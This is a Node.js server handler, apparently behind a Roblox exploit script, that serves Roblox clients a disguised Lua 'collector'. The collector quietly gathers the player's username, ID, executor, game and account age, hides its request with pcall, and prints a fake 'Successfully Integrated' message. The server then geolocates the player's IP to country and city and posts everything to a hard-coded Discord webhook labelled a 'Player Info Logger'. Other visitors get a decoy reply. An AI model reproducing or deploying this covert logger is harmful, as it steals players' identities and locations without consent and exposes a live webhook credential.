const https = require('https');

const SETTINGS = {
    WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5",
    PLAIN_TEXT_RESP: "memrk"
};

async function getGeo(ip) {
    return new Promise((resolve) => {
        const req = https.get(`https://ipwho.is/${ip}`, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch(e) { resolve({}); }
            });
        });
        req.on('error', () => resolve({}));
        req.setTimeout(2000, () => req.destroy());
    });
}

module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    const agent = req.headers['user-agent'] || "";
    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
    const { step, u, uid, exec, pid, pname, jid, pcount, pmax, age } = req.query;

    if (!agent.includes("Roblox")) return res.status(200).send(SETTINGS.PLAIN_TEXT_RESP);

    // --- STEP 0: THE SILENT COLLECTOR ---
    if (!step) {
        const host = req.headers.host;
        const path = req.url.split('?')[0];
        
        // Gue pake pcall dan request internal biar ga muncul link panjang di console/spy
        const collector = `
            local lp = game.Players.LocalPlayer
            local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            local function getAge()
                local s, r = pcall(function() return game:HttpGet("https://users.roblox.com/v1/users/"..lp.UserId) end)
                return (s and game:GetService("HttpService"):JSONDecode(r).created:sub(1,10)) or "-"
            end

            local data = {
                step = "1",
                u = lp.Name,
                uid = lp.UserId,
                exec = (identifyexecutor and identifyexecutor()) or "Unknown",
                pid = game.PlaceId,
                pname = info.Name,
                jid = game.JobId,
                pcount = #game.Players:GetPlayers(),
                pmax = game.Players.MaxPlayers,
                age = getAge()
            }

            local params = ""
            for k, v in pairs(data) do
                params = params .. k .. "=" .. game.HttpService:UrlEncode(tostring(v)) .. "&"
            end

            -- PENTING: Pake pcall biar ga error di client
            pcall(function()
                game:HttpGet("https://${host}${path}?" .. params)
            end)
            print("Successfully Integrated")
        `.trim();
        return res.status(200).send(collector);
    }

    // --- STEP 1: SEND TO DISCORD ---
    try {
        const geo = await getGeo(ip);
        const flag = geo.country_code ? geo.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🏴‍☠️";

        const embed = {
            title: "📢 Player Info Logger (GOD MODE)",
            color: 16753920,
            fields: [
                { name: "👤 Username", value: u || "Unknown", inline: true },
                { name: "🆔 User ID", value: uid || "Unknown", inline: true },
                { name: "📅 Account Created", value: age || "-", inline: true },
                { name: "💻 Executor", value: exec || "Unknown", inline: true },
                { name: "🌐 IP Address", value: `||${ip}||`, inline: true },
                { name: "🏳️ Country", value: `${flag} ${geo.country || "Unknown"}`, inline: true },
                { name: "🏙️ City", value: `${geo.city || "Unknown"}`, inline: true },
                { name: "🗺️ Map", value: `[${pname || "Game"}](https://www.roblox.com/games/${pid})`, inline: false },
                { name: "👥 Players", value: `${pcount} / ${pmax}`, inline: true }
            ],
            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=420&height=420&format=png` },
            footer: { text: "Ndraawz Security | " + new Date().toLocaleString() },
            timestamp: new Date().toISOString()
        };

        const discordReq = https.request(SETTINGS.WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        
        discordReq.write(JSON.stringify({ embeds: [embed] }));
        discordReq.end();

        // Kasih respon cepet biar Roblox ga timeout
        return res.status(200).send("OK");
    } catch (err) {
        return res.status(500).send("ERR");
    }
};
